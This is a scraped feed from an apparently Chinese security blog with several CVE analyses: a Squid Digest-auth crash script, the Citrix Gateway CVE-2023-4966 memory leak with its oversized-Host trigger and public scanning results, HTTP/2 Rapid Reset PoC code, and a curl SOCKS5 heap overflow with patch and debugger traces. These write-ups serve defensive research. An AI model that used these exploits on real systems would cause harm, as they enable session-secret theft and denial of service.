username=\u0026#34;{username}\u0026#34;,realm=\u0026#34;{realm}\u0026#34;,nonce=\u0026#34;{nonce}\u0026#34;,uri=\u0026#34;{uri}\u0026#34;,cnonce=\u0026#34;{cnonce}\u0026#34;,nc={nc},response=\u0026#34;{response}\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; username=\u0026#34;test\u0026#34; password=\u0026#34;123456\u0026#34; realm=\u0026#34;localhost\u0026#34; nc=\u0026#34;00000001\u0026#34;*100 cnonce = \u0026#39;\u0026#39;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32)) ha1 = hashlib.md5((username + \u0026#39;:\u0026#39; + realm + \u0026#39;:\u0026#39; + password).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() ha2= hashlib.md5(\u0026#34;GET:/\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)).hexdigest() resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False) if resp.status_code==407: resp_header = resp.headers nonce = resp_header[\u0026#34;Proxy-Authenticate\u0026#34;].split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;=\u0026#39;)[1].rstrip(\u0026#39;\u0026#34;\u0026#39;).lstrip(\u0026#39;\u0026#34;\u0026#39;) response = hashlib.md5((ha1+\u0026#34;:\u0026#34;+nonce+\u0026#34;:\u0026#34;+nc+\u0026#34;:\u0026#34;+cnonce+\u0026#34;:auth:\u0026#34;+ha2).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() print(\u0026#34;nonce: {}\\tcnonce: {}\\tresponse: {}\u0026#34;.format(nonce,cnonce,response)) rdata = data.format(username=username,realm=realm,nonce=nonce,uri=\u0026#34;/\u0026#34;,cnonce=cnonce,nc=nc,response=response) header = { \u0026#34;Proxy-Authorization\u0026#34;: rdata } print(rdata) resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False,headers=header) print(resp.status_code,resp.text) 小结 由于squid为多进程架构，在子进程因为漏洞退出时，父进程会重新生成子进程处理代理请求，实际利用比较鸡肋，也就不难理解该漏洞没有CVE编号了。\n参考链接\nhttps://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g https://datatracker.ietf.org/doc/html/rfc7616\nCreated at 2023-10-26T10:41:55+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/","title":"CVE 2023 4966 Citrix Gateway Info Disclosure","tags":["漏洞分析"],"description":"","content":"基本信息 Citrix中存在信息泄露漏洞，由于越界读取，未经授权的攻击者可以利用该漏洞获取到存储在内存的密钥。\n该漏洞在八月下旬观察到在野利用。\n其他\n这个漏洞在10.19就已经分析完了，当时扫描了一下公网受影响服务器发现影响比较大，所以没有公开详情，在昨天国外安全研究员公开了PoC，所以现在才写分析文章。\n指纹 hunter\nweb.title=\u0026#34;Citrix Gateway\u0026#34; 影响版本 NetScaler ADC and NetScaler Gateway 14.1 \u0026lt; 14.1-8.50 NetScaler ADC and NetScaler Gateway 13.1 \u0026lt; 13.1-49.15 NetScaler ADC and NetScaler Gateway 13.0 \u0026lt; 13.0-92.19 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.164 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.300 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.300 环境搭建 参照\rCVE-2023-3519 Citrix Gateway RCE搭建\n14.1-4.42 192.168.52.100\n14.1-8.50 192.168.52.105\n13.1-49.15 192.168.52.95\n技术分析\u0026amp;调试 初步分析 根据\r官方通告可知两个漏洞都是对内存的操作不当造成的。对应的CVSS3分别如下\nCVE-2023-4966 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L CVE-2023-4967 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H 综合可以知道如下信息： 利用漏洞无需权限、使用网络请求即可利用、均为内存型漏洞，应该跟[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)类似，对用户输入没做校验，其中CVE-2023-4966 应该是实现了越界读取内存。 函数diff diff nsppe文件，分析各个函数修改的地方。\n在逐个分析各个函数之后，目光转到ns_aaa_oauth_send_openid_config函数。\n在补丁中 ns_aaa_oauth_send_openid_config中对snprintf的返回值做了判断，在修复之前直接将snpritf的返回值放到了ns_vpn_send_response中，修复之后先判断返回值是否大于1FFFF。\nsnprintf将格式化的数据，写入内存中，原型为int snprintf(char *str, int n, char * format [, argument, ...]);，其中n为要写入的字符串的最大长度，snprintf最多会给内存写入n-1个字符，最后一个字符使用'\\0'，当要格式化后的字符串大于n时，会在n-1处截断。但此时，snprintf会返回格式化字符串的长度，而不是写入内存的长度。\n向上追溯调用栈，ns_aaa_oauth_send_openid_config被 ns_vpn_process_unauthenticated_request调用，将 ns_vpn_process_unauthenticated_request 代码给AI分析调用到该函数的路径，可知调用路径为 /oauth/idp/.well-known/openid-configuration 此处猜测未修复版本中会使用snprintf的返回值作为长度参数进行读取。 curl请求该接口，可以看到响应中中会把我们请求的host放进去\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: curl.test.site\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;Sec-Fetch-Dest: document\u0026#39; -H $\u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H $\u0026#39;Sec-Fetch-Site: none\u0026#39; -H $\u0026#39;Sec-Fetch-User: ?1\u0026#39; -H $\u0026#39;Te: trailers\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -b $\u0026#39;NSC_TASS=/menu/neo\u0026#39; $\u0026#39;https://192.168.52.234/oauth/idp/.well-known/openid-configuration\u0026#39; HTTP/1.1 200 OK X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Length: 717 Cache-control: no-cache, no-store, must-revalidate Pragma: no-cache Content-Type: application/json; charset=utf-8 X-Citrix-Application: Receiver for Web {\u0026#34;issuer\u0026#34;: \u0026#34;https://curl.test.site\u0026#34;, \u0026#34;authorization_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/login\u0026#34;, \u0026#34;token_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oaut h/idp/token\u0026#34;, \u0026#34;jwks_uri\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/certs\u0026#34;, \u0026#34;response_types_supported\u0026#34;: [\u0026#34;code\u0026#34;, \u0026#34;token\u0026#34;, \u0026#34;id_token\u0026#34;], \u0026#34;id_token_signing_alg_va lues_supported\u0026#34;: [\u0026#34;RS256\u0026#34;], \u0026#34;end_session_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/logout\u0026#34;, \u0026#34;frontchannel_logout_supported\u0026#34;: true, \u0026#34;scopes_supported \u0026#34;: [\u0026#34;openid\u0026#34;, \u0026#34;ctxs_cc\u0026#34;], \u0026#34;claims_supported\u0026#34;: [\u0026#34;sub\u0026#34;, \u0026#34;iss\u0026#34;, \u0026#34;aud\u0026#34;, \u0026#34;exp\u0026#34;, \u0026#34;iat\u0026#34;, \u0026#34;auth_time\u0026#34;, \u0026#34;acr\u0026#34;, \u0026#34;amr\u0026#34;, \u0026#34;email\u0026#34;, \u0026#34;given_name\u0026#34;, \u0026#34;family_name\u0026#34;, \u0026#34;nic kname\u0026#34;], \u0026#34;userinfo_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/userinfo\u0026#34;, \u0026#34;subject_types_supported\u0026#34;: [\u0026#34;public\u0026#34;]} 前面知道print_temp_rule大小为0x20000，返回值中共有6处重复了host，所以我们传入的host长度\u0026gt;21845(粗略估计)就可以触发溢出。再次请求，发现可以利用超长host读取到Citrix内存，实际测试发现host长度最多到24100左右。\n借助这个漏洞，写了一个nuclei模板对公网扫描，对八百个独立IP扫描，截止至10.20，仍然有大约15%未修复，且通过这个漏洞可以读取到内存中的secret，后续可以借助这个secret绕过身份验证，请求后端接口。\n这个接口也在oauth的配置中有提到\rhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nns_aaa_oauthrp_send_openid_config函数类似，也snprintf的返回值做了判断。 调试\n关闭看门狗对nsppe进程发送的信号，而后直接在对应位置处下断点即可。\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 PoC\nhttps://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml 实际利用\n通过漏洞可以读取到内存中的已登录会话的secret。\n小结 该漏洞整体分析、利用较为简单， 通过朴实无华的越界读取即可造成信息泄露，也无需进行内存布局。其实整体看nsppe，很多使用了snprintf的地方都对其返回值进行了判断，本次漏洞点没有对返回值做判断可能是因为开发时遗漏了。\n另外即使修复该漏洞之后，已被劫持的会话仍然有效，需要使用如下命令清除已登录的会话\nclar lb persistentSessions \u0026lt;vServer\u0026gt; 参考链接\nhttps://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\nhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nhttps://www.citrix.com/downloads/citrix-adc/\nCreated at 2023-10-26T10:18:12+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/","title":"CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析","tags":["漏洞分析"],"description":"","content":"基本信息 利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。\n影响范围 Go \u0026lt; 1.21.3 Go \u0026lt; 1.20.10\n11.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 11.0.0-M11 10.1.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 10.1.13 9.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 9.0.80 8.5.0 \u0026lt;= Apache Tomcat \u0026lt;= 8.5.9\ngrpc-go \u0026lt; 1.58.3 grpc-go \u0026lt; 1.57.1 grpc-go \u0026lt; 1.56.3\n环境搭建 使用go起一个http2 server。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, \u0026#34;Hello World!\u0026#34;) }) http.ListenAndServeTLS(\u0026#34;:443\u0026#34;, \u0026#34;certs/cert.pem\u0026#34;, \u0026#34;certs/key.pem\u0026#34;, nil) } 使用curl测试是否成功 curl https://localhost -i -k --http2 -vvv。也可以使用nginx搭建一个http2服务器，配置很多博客都有就不写了。\n➜ http curl https://localhost -i -k --http2 -vvv * Trying 127.0.0.1:443... * Connected to localhost (127.0.0.1) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * ALPN: server accepted h2 * Server certificate: * subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * start date: Oct 12 08:46:51 2023 GMT * expire date: Oct 9 08:46:51 2033 GMT * issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/2 * h2h3 [:method: GET] * h2h3 [:path: /] * h2h3 [:scheme: https] * h2h3 [:authority: localhost] * h2h3 [user-agent: curl/7.88.1] * h2h3 [accept: */*] * Using Stream ID: 1 (easy handle 0x55566530a9e0) \u0026gt; GET / HTTP/2 \u0026gt; Host: localhost \u0026gt; user-agent: curl/7.88.1 \u0026gt; accept: */* \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): \u0026lt; HTTP/2 200 HTTP/2 200 \u0026lt; content-type: text/plain; charset=utf-8 content-type: text/plain; charset=utf-8 \u0026lt; content-length: 12 content-length: 12 \u0026lt; date: Fri, 13 Oct 2023 06:52:06 GMT date: Fri, 13 Oct 2023 06:52:06 GMT \u0026lt; * Connection #0 to host localhost left intact Hello World!# 技术分析 其实这个在我看来某些方面看也不算漏洞，根据\rRFC9113规定，在HTTP2 setting阶段服务器可以声明支持的最大并发流，同时规定了客户端或服务端可以随时发送RST_STREAM以取消流，在收到RST_STREAM接收方不能在发送其他数据，除了优先级，协议并未规定客户端发送RST_STREAM的阈值，那么各大语言和软件实现的时候可能限制也有可能不限制RST_STREAM的阈值。这属于是各自实现方式的问题。 从协议层面讲，客户端直接RST_STREAM没有问题，典型的场景是用户在浏览器访问网站期间因为某些原因直接关闭了页面，此时浏览器需要向服务端发送RST_STREAM帧来取消流，可以帮助服务器节省资源。\nHTTP的几种DDOS HTTP 1.1 在HTTP 1.1中使用单个TCP连接顺序发送请求和响应，在前面的请求被响应之后才可以发送后续的请求，不能被多路复用，此时如果要对其进行DOS的话需要大量机器打开TCP连接顺序发送请求，消耗资源。 HTTP 2 HTTP2中实现了多路复用和并发，可以异步请求，客户端和服务端通过流ID来识别数据属于哪一个请求，这和HTTP1.1 相比，客户端可以启用大量并行请求，造成服务器负载上升，所以为了防护这种情况，在HTTP2初始化的时候，SETTINGS_MAX_CONCURRENT_STREAMS允许服务器向客户端通告最大允许的并发流，超过这个限制的流，服务器会返回RST_STREAM来拒绝这个流。HTTP2各个状态可以使用状态机表示，当服务器收到客户端发送的HEADERS帧时，会将流状态从空闲转换为打开，而后转为半关闭状态，只有流处于打开状态或半关闭状态才会被计入打开的流数量。 来源:\rhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\n上面提到，只有打开和半关闭的流才会计入流数量，影响并发限制，当客户端发送RST_STREAM时，流状态会从半关闭状态转入关闭状态，即释放了一个流，此时客户端可以立即发起一个新请求占用释放的流，这就是CVE-2023-44487的关键。恶意客户端可以在打开大量流之后立即发送RST_STREAM帧，这样在请求到达服务器，而服务器暂未准备好响应时，这个请求的RST_STREAM帧随机到达服务器，服务器取消这个流并释放一个并发流。\n图片来源：\rhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\n在标准HTTP2 DDOS的时候，恶意客户端可以打开服务器允许的最大限制的流数量而后发送请求，服务器依次响应，循环这个过程，消耗服务器资源。 而变种HTTP2 DDOS中，攻击者可以利用CVE-2023-44487 绕过这个限制，滥用HTTP 2的取消请求，快速重置无限数量的流，根据RFC 服务器收到RST_STREAM帧之后不需要返回数据，在现实实现时，服务器收到了客户端的HRADERS请求，在收到RST_STREAM之前，需要解析客户端请求的资源，在收到RST_STREAM之后需要释放资源，所以在客户端只需要付出带宽的代价下，服务器会付出比这个高得多的代价，导致高效率的DDOS。\n补丁分析\n在go中支持HTTP2协议的解析，所以go也受这个漏洞影响，下面是go修复漏洞的补丁diff 对比go修复这个漏洞的补丁，主要修复逻辑在http2#scheduleHandler，其中advMaxStreams默认为250，当在处理的流超过了250，则比较未开始处理的流数量是否大于1000，大于则报错。 可以看出来补丁主要是限制了同时并发流的数量。该方法在processHeaders中调用，可以看出来，在原先逻辑中，会直接处理客户端请求，而在补丁中会判断当前流的数量，在范围内才会调用 go sc.runHandler(rw, req, handler)处理请求\ntype unstartedHandler struct { streamID uint32 rw *responseWriter req *http.Request handler func(http.ResponseWriter, *http.Request) } // scheduleHandler starts a handler goroutine, // or schedules one to start as soon as an existing handler finishes. func (sc *serverConn) scheduleHandler(streamID uint32, rw *responseWriter, req *http.Request, handler func(http.ResponseWriter, *http.Request)) error { sc.serveG.check() maxHandlers := sc.advMaxStreams if sc.curHandlers \u0026lt; maxHandlers { sc.curHandlers++ go sc.runHandler(rw, req, handler) return nil } if len(sc.unstartedHandlers) \u0026gt; int(4*sc.advMaxStreams) { return sc.countError(\u0026#34;too_many_early_resets\u0026#34;, ConnectionError(ErrCodeEnhanceYourCalm)) } sc.unstartedHandlers = append(sc.unstartedHandlers, unstartedHandler{ streamID: streamID, rw: rw, req: req, handler: handler, }) return nil } func (sc *serverConn) handlerDone() { sc.serveG.check() sc.curHandlers-- i := 0 maxHandlers := sc.advMaxStreams for ; i \u0026lt; len(sc.unstartedHandlers); i++ { u := sc.unstartedHandlers[i] if sc.streams[u.streamID] == nil { // This stream was reset before its goroutine had a chance to start. continue } if sc.curHandlers \u0026gt;= maxHandlers { break } sc.curHandlers++ go sc.runHandler(u.rw, u.req, u.handler) sc.unstartedHandlers[i] = unstartedHandler{} // don\u0026#39;t retain references } sc.unstartedHandlers = sc.unstartedHandlers[i:] if len(sc.unstartedHandlers) == 0 { sc.unstartedHandlers = nil } } nginx针对这个漏洞也出了一份\r官方通告指出默认配置不受此漏洞影响，即 keepalive_requests 1000;http2_max_concurrent_streams 128;这个配置也可以对应上go补丁中的250最大stream和1000个队列。\n虽然默认配置不受该漏洞影响，但nginx也针对这个漏洞进行了修复，commit为\r6ceef192e7af1c507826ac38a2d43f08bf265fb9，在该commit中也是统计并限制了并发流数量，超过某个阈值则返回错误。\n开发PoC\n在GitHub的\rPoC经过实际测试，没有达到谷歌和CF所说的在发HTTP2请求之后立马重置，也就是无效PoC。根据代码逻辑，在发送HTTP2 header之后PoC接着尝试接收服务器返回的数据，如果服务端返回了StreamReset则打印已成功取消，如果是RequestReceived则调用conn.reset_stream，但实际利用应该是发送HTTP2 header之后立马发送RST_Stream，而后打开一个新流重复如上过程。 实际测试发现，conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)永远不会被调用到，也就是该PoC会执行完整的HTTP2请求，完事之后服务端返回RST_STREAM，打印已取消，这明显是错误的。\nstream_id = conn.get_next_available_stream_id() conn.send_headers( stream_id, [(\u0026#39;:method\u0026#39;, \u0026#39;GET\u0026#39;), (\u0026#39;:authority\u0026#39;, url), (\u0026#39;:path\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;:scheme\u0026#39;, \u0026#39;https\u0026#39;)], ) sock.sendall(conn.data_to_send()) # Read some data while True: data = sock.recv(65535) if not data: break events = conn.receive_data(data) for event in events: if isinstance(event, RequestReceived): # Cancel the stream with error code for CANCEL conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL) elif isinstance(event, StreamReset): print(f\u0026#34;Stream {event.stream_id} cancelled.\u0026#34;) 所以我们只需要将接收数据的逻辑去掉，改为发送headers之后直接发送reset即可，PoC晚些时候会上传到\rGitHub上。 利用效果如下，单个进程单个线程可以使服务CPU占用20%\n当然这个漏洞PoC也适合使用go写，我这边go写的并发有点问题，不如python版本稳定。\n抓包分析\n运行PoC抓包，解密，wireshark摘要如下：\n在本次环境中，服务器通告的最大并发流为250。在下面的数据包中，客户端先发送HEADERS请求，而后发送RST_STREAM请求，循环往复。\n通过这种办法客户端不用等待服务器响应，发送速率只受自己带宽限制，从而并非服务器在HTTP2协议初始化时声明的最大并发流限制。\n小结 HTTP2 DOS原理较为简单，利用RFC所规定的协议特性，本质上属于滥用，而CloudFlare对此的应对策略是当客户端重置次数超过某个阈值则认为是恶意客户端，关闭该连接。\n由于nginx默认配置不受影响，所以受此漏洞影响的大部分是go 或者java启动的HTTP服务，同时如果使用nginx反代后端服务，即使后端服务支持HTTP2，nginx也会将请求降级到HTTP 1.1。\n可预见的将来，此次这种漏洞的出现不会是最后一次，hope the internet will become more and more secure.\n参考链接\nhttps://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers\nhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nhttps://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/\nCreated at 2023-10-13T15:11:25+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/","title":"CVE-2023-38545 Curl 堆溢出漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。\n影响版本 7.69.0 \u0026lt;= libcurl \u0026lt;= 8.3.4\n环境搭建 sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install 技术分析\u0026amp;调试 补丁 漏洞在\rfb4415d8aee6c1045be932a34fe6107c2f5ed147修复，修复代码如下 从修复代码中可以看出两个区别\n当socks5_resolve_local=false and hostname_len \u0026gt;255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true 将hostname_len转为unsigned char后赋值给socksreq[len++] 修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用 static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-\u0026gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; 向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中\nstatic CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-\u0026gt;conn; int sockindex = cf-\u0026gt;sockindex; struct socks_state *sx = cf-\u0026gt;ctx; if(cf-\u0026gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-\u0026gt;next-\u0026gt;cft-\u0026gt;do_connect(cf-\u0026gt;next, data, blocking, done); if(result || !*done) return result; if(!sx) { sx = calloc(sizeof(*sx), 1); if(!sx) return CURLE_OUT_OF_MEMORY; cf-\u0026gt;ctx = sx; } if(sx-\u0026gt;state == CONNECT_INIT) { /* for the secondary socket (FTP), use the \u0026#34;connect to host\u0026#34; * but ignore the \u0026#34;connect to port\u0026#34; (use the secondary port) */ sxstate(sx, data, CONNECT_SOCKS_INIT); sx-\u0026gt;hostname = conn-\u0026gt;bits.httpproxy ? conn-\u0026gt;http_proxy.host.name : conn-\u0026gt;bits.conn_to_host ? conn-\u0026gt;conn_to_host.name : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondaryhostname : conn-\u0026gt;host.name; sx-\u0026gt;remote_port = conn-\u0026gt;bits.httpproxy ? (int)conn-\u0026gt;http_proxy.port : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondary_port : conn-\u0026gt;bits.conn_to_port ? conn-\u0026gt;conn_to_port : conn-\u0026gt;remote_port; sx-\u0026gt;proxy_user = conn-\u0026gt;socks_proxy.user; sx-\u0026gt;proxy_password = conn-\u0026gt;socks_proxy.passwd; } result = connect_SOCKS(cf, sx, data); struct Curl_cftype Curl_cft_socks_proxy = { \u0026#34;SOCKS-PROXYY\u0026#34;, CF_TYPE_IP_CONNECT, 0, socks_proxy_cf_destroy, socks_proxy_cf_connect, socks_proxy_cf_close, socks_cf_get_host, socks_cf_get_select_socks, Curl_cf_def_data_pending, Curl_cf_def_send, Curl_cf_def_recv, Curl_cf_def_cntrl, Curl_cf_def_conn_is_alive, Curl_cf_def_conn_keep_alive, Curl_cf_def_query, }; 技术分析和动态调试 本次修复的函数do_SOCKS5实现了处理SOCKS5连接中的各个状态的代码，这个函数实现了一个状态机，状态机根据在socks连接中的不同状态进行不同操作，第一次调用do_SOCKS5时，socks5_resolve_local被初始化为 false，同时状态机状态为CONNECT_SOCKS_INIT\nbool socks5_resolve_local = (conn-\u0026gt;socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE; gef➤ p socks5_resolve_local $5 = 0x0 函数进入CONNECT_SOCKS_INIT分支，由于传递给curl的主机名超长，大于255，进入if中，socks5_resolve_local被赋值为true，代表此时应该使用本地解析\nswitch(sx-\u0026gt;state) { case CONNECT_SOCKS_INIT: if(conn-\u0026gt;bits.httpproxy) infof(data, \u0026#34;SOCKS5: connecting to HTTP proxy %s port %d\u0026#34;, sx-\u0026gt;hostname, sx-\u0026gt;remote_port); /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */ if(!socks5_resolve_local \u0026amp;\u0026amp; hostname_len \u0026gt; 255) { infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); socks5_resolve_local = TRUE; } 此时调用栈如下：\n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:socks.c+595 ──── 590 infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; 591 \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); 592 socks5_resolve_local = TRUE; 593 } 594 // auth=0x5 → 595 if(auth \u0026amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI)) 596 infof(data, 597 \u0026#34;warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u\u0026#34;, 598 auth); 599 if(!(auth \u0026amp; CURLAUTH_BASIC)) 600 /* disable username/password auth */ ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;curl\u0026#34;, stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── gef➤ p socks5_resolve_local $6 = 0x1 gef➤ bt #0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573 #1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #10 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 gef➤ 在这状态下，curl会初始化一些SOCKS请求body并将其发送给socks server，而后将状态转为 CONNECT_SOCKS_READ_INIT并跳转到对应代码处。\nidx = 0; socksreq[idx++] = 5; /* version */ idx++; /* number of authentication methods */ socksreq[idx++] = 0; /* no authentication */ if(allow_gssapi) socksreq[idx++] = 1; /* GSS-API */ if(sx-\u0026gt;proxy_user) socksreq[idx++] = 2; /* username/password */ /* write the number of authentication methods */ socksreq[1] = (unsigned char) (idx - 2); sx-\u0026gt;outp = socksreq; sx-\u0026gt;outstanding = idx; presult = socks_state_send(cf, sx, data, 